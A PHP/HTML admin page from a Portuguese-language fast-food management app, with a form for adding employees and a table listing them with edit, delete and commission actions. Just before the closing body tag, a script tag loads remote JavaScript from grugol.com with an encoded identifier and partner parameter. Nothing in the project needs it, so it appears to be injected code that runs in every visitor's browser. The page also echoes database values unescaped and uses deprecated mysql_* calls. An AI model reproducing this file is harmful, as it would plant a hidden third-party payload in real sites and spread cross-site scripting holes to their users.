<!DOCTYPE html>
<html>
<?php 
  require_once 'includes/connect_db.php';
?>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>fastfood v1 - Start</title>
  <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
  <!-- Include all compiled plugins (below), or include individual files as needed -->
  <script src="bootstrap/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
  <script type="text/javascript" src="jquery.quick.search.js"></script>
  <link rel="stylesheet" href="css/style.css">
  <script language="javascript" type="text/javascript" src="js/mascara_validacao.js"></script>
</head>
<body>
<div class="container">
 <?php include "menu.php" ?>

 <!-- Button trigger modal -->
  <button type="button" class="btn btn-success" data-toggle="modal" data-target="#myModal">
    Adicionar Funcionario
  </button>

  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header" style="background:#333;color:#fff;">
          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title text-center" id="myModalLabel">Adicionar Funcionario</h4>
        </div>
        <div class="modal-body">
        <form action="includes/processadados.php?go=cadastraruser" name ="formulario" id="formulario" method="post" class="form-group">
        Nome:
        <div class="form-group">
          <input type="text" name="nome" class="form-control" required>
        </div>
        Data de Nascimento:
        <div class="form-group">
          <input type="date" name="dt_nasc" class="form-control">
        </div>
        Telefone:
        <div class="form-group">
          <input type="text" name="fone" class="form-control" onkeypress='mascTel(formulario.fone)' value="() -" onblur='ValidaTelefone(formulario.fone)' maxlength="14" >
        </div>
        Endereço:
        <div class="form-group">
          <input type="text" name="endereco" class="form-control" required>
        </div>
        CPF:
        <div class="form-group">
          <input type="text" name="cpf" class="form-control" onkeypress="mascCPF(formulario.cpf);" maxlength="14"  required>
        </div>
        RG:
        <div class="form-group">
          <input type="text" name="rg" class="form-control" onkeypress="mascCPF(formulario.rg);" maxlength="13"  required>
        </div>
        Escolaridade:
        <div class="form-group">
        <select name="escolaridade" class="form-control">
          <option>Curso Técnico</option>
          <option>Ensino Médio</option>
          <option>Ensino Superior</option>
        </select></div>
        Login:
        <div class="form-group">
          <input type="text" name="login" class="form-control"  required>
        </div>
        Senha:
        <div class="form-group">
          <input type="password" name="senha" class="form-control" required>
        </div>
        Função do Funcionario:
        <div class="form-group">
        <select name="perfil" class="form-control">
          <option value="0">Garçom</option>
          <option value="1">Gerente</option>
        </select></div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Cancelar</button>
          <button type="submit" class="btn btn-success">Cadastrar</button>
         </form>
        </div>
      </div>
    </div>
  </div>

<?php
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 1:
?>
<div class="alert alert-success" role="alert" style="height:relative;width:690px;left:325px;margin-top:10px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-ok" aria-hidden="true"></span>
  Usuário cadastrado com sucesso!
</div>
<?php
    }
  }
?> 
<?php
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 2:
?>
<div class="alert alert-danger" role="alert" style="height:relative;width:690px;left:325px;margin-top:10px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>
  Usuário excluido com sucesso!
</div>
<?php
    }
  }
?> 
<?php
if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 3:
?>
<div class="alert alert-info" role="alert" style="height:relative;width:690px;left:325px;margin-top:10px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
  Usuário alterado com sucesso!
</div>
<?php
    }
  }
?> 
<div class="row marketing" style=" border: 1px solid rgb(225, 232, 237); border-radius: 4px; ">
<h4 class="text-center">Lista de Funcionarios Cadastrados</h4>

<div class="col-lg-10">
  <table class="table" style="margin-top:10px;margin-left:55px;">
    <thead>
      <tr>
        <td style="font-weight:bold;">COD</td>
        <td style="font-weight:bold;">Nome</td>
        <td style="font-weight:bold;">Telefone</td>
        <td style="font-weight:bold;">Escolaridade</td>
        <td style="font-weight:bold;">Alterar</td>
        <td style="font-weight:bold;">Excluir</td>
        <td style="font-weight:bold;">Comissão</td>
      </tr>
    </thead>
<?php 
  $resultado = mysql_query("SELECT * FROM tab_usuario",$dbconn);
  if ($resultado) {
  while ($row = mysql_fetch_assoc($resultado)) {
?>
<tbody>
  <td>
    <?php echo "<p></p>", $row['id'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['nome'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['fone'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['escolaridade'] ?>
  </td>
<td>
<form action="alterar_usuario.php?id=<?php echo $row['id'];?>" method="POST">
   <input type="submit" value="Alterar" name="Submit" class='btn btn-sm btn-primary'>
</form>
</td>
<td>
<form action="includes/functions/excluir_usuario.php?id=<?php echo $row['id']; ?>" method="POST">
    <input type="submit" value="Excluir" name="Submit" class='btn btn-sm btn-danger'>
</form>
</td>
<td class="td">
  <form action="calcula-comissao.php" method="post">
    <input type="hidden" name="id" value="<?=$row['id']?>">
    <input type="submit" value="Calcular" class="btn btn-sm btn-success">
  </form>
  </td>
</tbody>
<?php 
    }
  }
mysql_close($dbconn);
?>
</table>
          
        </div>
      </div>

  <!-- fim da classe container -->

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>

  
</body>
</html>